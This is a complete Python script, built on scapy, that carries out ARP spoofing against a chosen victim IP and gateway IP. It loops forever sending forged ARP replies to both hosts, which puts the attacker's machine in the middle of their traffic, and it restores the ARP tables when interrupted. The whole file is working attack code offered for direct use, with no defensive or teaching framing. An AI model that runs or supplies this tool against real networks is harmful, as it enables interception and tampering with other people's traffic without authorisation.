import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target',
                        help='Target/Victim IP Address.')
    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='Gateway IP address.')
    options = parser.parse_args()
    if not options.target:
        parser.error('[-] Please specify Target IP, use --help for more info.')
    if not options.gateway:
        parser.error(
            '[-] Please specify Gateway IP, use --help for more info.')
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # scapy.ls(scapy.ARP)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)  # spoofing target
        spoof(gateway_ip, target_ip)  # spoofing router
        sent_packets_count += 2
        print("\033[92m\r[+] Packets sent: " +
              str(sent_packets_count)+'\033[0m', end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\033[1m\n\n[-] Reseting ARP tables ... Please Wait.')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print('Done. Bye!')
except IndexError:
    print('\033[91m\n[-] Could not send the packets. Use --help for more info.')
